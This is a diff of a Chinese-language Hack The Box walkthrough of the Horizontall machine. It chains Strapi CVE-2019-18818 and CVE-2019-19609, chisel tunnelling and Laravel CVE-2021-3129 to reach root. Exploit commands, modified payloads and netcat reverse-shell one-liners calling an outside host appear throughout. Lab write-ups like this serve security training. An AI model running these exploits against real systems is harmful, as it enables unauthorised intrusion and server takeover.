@@ -53,11 +53,15 @@ Target: http://horizontall.htb/
 
 只有几个文件夹，没啥有用的发现
 
+## vhost爆破
+
+这里我卡了很久，找不到任何有用的东西，后来上论坛看hint，有人留言说二级域名可能有点东西
+
 尝试爆破vhost，我们使用gobuster 
 
 先把[这个字典](https://github.com/danielmiessler/SecLists)下载到本地
 
-gobuster vhost -u horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 
+
 
 ```
 ┌──(root💀kali)-[~/htb/Horizontall]
@@ -85,10 +89,11 @@ Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
 
 找到一个可以利用的二级域名：```api-prod.horizontall.htb```
 
-编辑```/etc/hosts```
+再次编辑```/etc/hosts```
 
 把```10.10.11.105 horizontall.htb```替换成```10.10.11.105 api-prod.horizontall.htb```
 
+现在我们可以在浏览器打开```api-prod.horizontall.htb```了
 
 ## 爆破二级域名
 ```
@@ -179,6 +184,7 @@ Target: http://api-prod.horizontall.htb/
 有一个admin的后台
 查看网页源代码，发现这个后台是由一个叫```Strapi```的cms做的
 
+## CVE-2019-18818
 我们在谷歌搜索这个cms的漏洞利用脚本，选择[这个exp](https://www.exploit-db.com/exploits/50239)
 
 下载到本地以后执行攻击
@@ -193,13 +199,13 @@ Target: http://api-prod.horizontall.htb/
 [+] Password reset was successfully
 [+] Your email is: admin@horizontall.htb
 [+] Your new credentials are: admin:SuperStrongPassword1
-[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NzY5NTcyLCJleHAiOjE2NDEzNjE1NzJ9.4rETx89O06Mqa1fWj4uwUVhqK9krXg6dP4BzfudH4mI
 ```
 此时我们有了一个cms的登录凭证：```admin:SuperStrongPassword1```
 
-同时记住这个token：```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc```
+同时记住这个token：```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NzY5NTcyLCJleHAiOjE2NDEzNjE1NzJ9.4rETx89O06Mqa1fWj4uwUVhqK9krXg6dP4BzfudH4mI```
 
-
+## CVE-2019-19609
 登录进入后台以后，我们在仪表盘发现cms的版本号是：```Strapi v3.0.0-beta.17.4```
 
 根据这个版本号。在谷歌上搜索可以利用的exp，我们找到[这个攻击脚本](https://www.exploit-db.com/exploits/50238)
@@ -209,12 +215,12 @@ Target: http://api-prod.horizontall.htb/
 执行下面payload
 
 
-> python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc" "id" "10.10.14.15" 
+> python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NzY5NTcyLCJleHAiOjE2NDEzNjE1NzJ9.4rETx89O06Mqa1fWj4uwUVhqK9krXg6dP4BzfudH4mI" "id" "10.10.14.16" 
 
 
 ```
 ┌──(root💀kali)-[~/htb/Horizontall]
-└─# python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc" "id" "10.10.14.15"
+└─# python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NzY5NTcyLCJleHAiOjE2NDEzNjE1NzJ9.4rETx89O06Mqa1fWj4uwUVhqK9krXg6dP4BzfudH4mI" "id" "10.10.14.16"
 
 =====================================
 CVE-2019-19609 - Strapi RCE
@@ -225,7 +231,7 @@ https://m3n0sd0n4ld.github.io/
 
 [+] Successful operation!!!
 listening on [any] 9999 ...
-connect to [10.10.14.15] from (UNKNOWN) [10.10.11.105] 45258
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.105] 45258
 uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
 {"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
 
@@ -290,7 +296,7 @@ if __name__ == '__main__':
 		}
 
 		postData = {
-			"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4242 >/tmp/f)" 
+			"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4242 >/tmp/f)" 
 		}
 		
 		print(logoType)
@@ -310,7 +316,7 @@ if __name__ == '__main__':
 > "plugin":"documentation && $(%s > /tmp/.m3 && nc %s %s < /tmp/.m3 | rm /tmp/.m3)" % (command, lhost, lport)
 
 改成：
-> "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4242 >/tmp/f)" 
+> "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4242 >/tmp/f)" 
 
 保存。
 
@@ -320,7 +326,7 @@ if __name__ == '__main__':
 ```
 ─# nc -lnvp 4242               
 listening on [any] 4242 ...
-connect to [10.10.14.15] from (UNKNOWN) [10.10.11.105] 58760
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.105] 58760
 /bin/sh: 0: can't access tty; job control turned off
 $ id
 uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
@@ -328,18 +334,170 @@ $ whoami
 strapi
 
 ```
-
+# 提权
 查看所有tcp连接
 ```
 netstat -nap|grep tcp
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:8088            0.0.0.0:*               LISTEN      30505/python3       
-tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1856/node /usr/bin/ 
 tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 10.10.11.105:59330      10.10.14.15:4242        CLOSE_WAIT  30456/nc            
-tcp        0     23 10.10.11.105:59348      10.10.14.15:4242        ESTABLISHED 33027/nc            
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1845/node /usr/bin/ 
+tcp        0     23 10.10.11.105:35982      10.10.14.16:4242        ESTABLISHED 2825/nc             
 tcp6       0      0 :::80                   :::*                    LISTEN      -                   
 tcp6       0      0 :::22                   :::*                    LISTEN      -     
 ```
+
+查看所有进程
+```
+ps -aux |more
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+strapi     1798  0.0  0.3  76648  7324 ?        Ss   05:40   0:00 /lib/systemd/systemd --user
+strapi     1834  0.0  2.0 610056 40608 ?        Ssl  05:40   0:00 PM2 v4.5.6: God Daemon (/opt/strapi/.pm2)
+strapi     1845  0.4  3.5 910600 72176 ?        Ssl  05:40   0:03 node /usr/bin/strapi
+strapi     2801  0.2  2.0 804984 40656 ?        Sl   05:50   0:00 npm
+strapi     2819  0.0  0.0   4640   932 ?        S    05:50   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4242 >/tmp/f)"
+strapi     2820  0.0  0.0   4640   104 ?        S    05:50   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4242 >/tmp/f)"
+strapi     2823  0.0  0.0   6328   748 ?        S    05:50   0:00 cat /tmp/f
+strapi     2824  0.0  0.0   4640   816 ?        S    05:50   0:00 /bin/sh -i
+strapi     2825  0.0  0.1  15724  2184 ?        S    05:50   0:00 nc 10.10.14.16 4242
+strapi     2844  0.0  0.4  38980  9768 ?        S    05:51   0:00 python3 -c __import__('pty').spawn('/bin/bash')
+strapi     2845  0.0  0.2  21364  5152 pts/0    Ss   05:51   0:00 /bin/bash
+strapi     2930  0.0  0.1  38384  3508 pts/0    R+   05:53   0:00 ps -aux
+strapi     2931  0.0  0.0   8424   932 pts/0    S+   05:53   0:00 more
+```
+
+根据进程和本地连接显示，有3个进程是只允许127.0.0.1本地监听的
+3306是数据库，这个正常
+1337是我们进来时候是strapi，我们从外网通过二级域名也可以访问
+剩下的8000端口不知道是什么服务，我们用隧道连接看看
+
+
+## chisel隧道连接
+kali端
+```
+┌──(root💀kali)-[~/chisel]
+└─# ./chisel server -p 8888 --reverse
+2021/12/06 01:19:43 server: Reverse tunnelling enabled
+2021/12/06 01:19:43 server: Fingerprint RrZsQFbor2kqfDlA6y9yeOs9BiezohKLhkENPxg4P9A=
+2021/12/06 01:19:43 server: Listening on http://0.0.0.0:8000
+2021/12/06 01:20:59 server: session#1: tun: proxy#R:1337=>localhost:1337: Listening
+
+```
+靶机端
+```
+strapi@horizontall:/tmp$ ./chisel client 10.10.14.16:8888 R:8000:localhost:8000
+<hisel client 10.10.14.16:8000 R:1337:localhost:1337
+2021/12/06 06:22:21 client: Connecting to ws://10.10.14.16:8000
+2021/12/06 06:22:24 client: Connected (Latency 386.283845ms)
+
+```
+现在我们本地已经监听到这个端口的服务了
+```
+┌──(root💀kali)-[~]
+└─# netstat -ano |grep 8000
+tcp6       0      0 :::8000                 :::*                    LISTEN      off (0.00/0/0)
+
+```
+
+
+
+浏览器打开```localhost：8000```是一个Laravel的展示页，显示版本是```Laravel v8 (PHP v7.4.18) ```
+
+
+爆破这个站点，看看有什么文件和目录
+```
+┌──(root💀kali)-[~/dirsearch]
+└─# python3 dirsearch.py -e* -t 100 -u http://localhost:8000                                                               
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
+
+Output File: /root/dirsearch/reports/localhost-8000/_21-12-06_01-38-51.txt
+
+Error Log: /root/dirsearch/logs/errors-21-12-06_01-38-51.log
+
+Target: http://localhost:8000/
+
+[01:38:52] Starting: 
+[01:39:14] 200 -  603B  - /.htaccess                                       
+[01:39:14] 200 -   17KB - /.htaccess/                                      
+[01:39:48] 405 -  547KB - /_ignition/execute-solution                       
+[01:40:51] 200 -    1KB - /web.config  
+```
+## CVE-2021-3129
+查看```/_ignition/execute-solution ```目录，结合页面信息谷歌搜索有可能存在```CVE-2021-3129```
+
+我在github上找到了[这个exp](https://github.com/ambionics/laravel-exploits)
+
+根据exp的攻击步骤，首先要在kali上安装phpggc
+
+> sudo apt install phpggc
+
+把执行命令```id```编译到```/tmp/exploit.phar```文件
+
+```
+┌──(root💀kali)-[~/htb/Horizontall/phpggc]
+└─# php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system id
+
+```
+
+
+查看tmp文件夹下已经生成了一个phar文件
+```
+┌──(root💀kali)-[~/htb/Horizontall/phpggc]
+└─# ll /tmp/exploit.phar 
+-rw-r--r-- 1 root root 514 12月  6 02:33 /tmp/exploit.phar
+
+```
+
+
+执行攻击：
+
+```
+┌──(root💀kali)-[~/htb/Horizontall]
+└─# python3 exp3.py  http://localhost:8000/ /tmp/exploit.phar                                                                                                                                                                           1 ⨯
++ Log file: /home/developer/myproject/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+--------------------------
+uid=0(root) gid=0(root) groups=0(root)
+--------------------------
++ Logs cleared
+
+```
+
+成功回显命令，发现是root权限
+
+
+上面已经证明漏洞存在，可以执行任意命令，编译反弹shell
+```
+┌──(root💀kali)-[~/htb/Horizontall/phpggc]
+└─# php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 4444 >/tmp/f'
+
+```
+
+开启一个监听
+> nc -lnvp 4444  
+
+再次执行攻击，收到root的反弹shell
+
+```
+┌──(root💀kali)-[~]
+└─# nc -lnvp 4444                                                                                                                                                                                                                       1 ⨯
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.105] 60848
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+
+```
+
+# 总结
+这是我第一次打HTB现役的机器，断断续续还花了挺长时间，vhost和隧道那里是很关键的两步，不然没法做下去，我自己也是看了论坛上作者的hint才想到。。
+吃过的亏都是经验，继续努力。
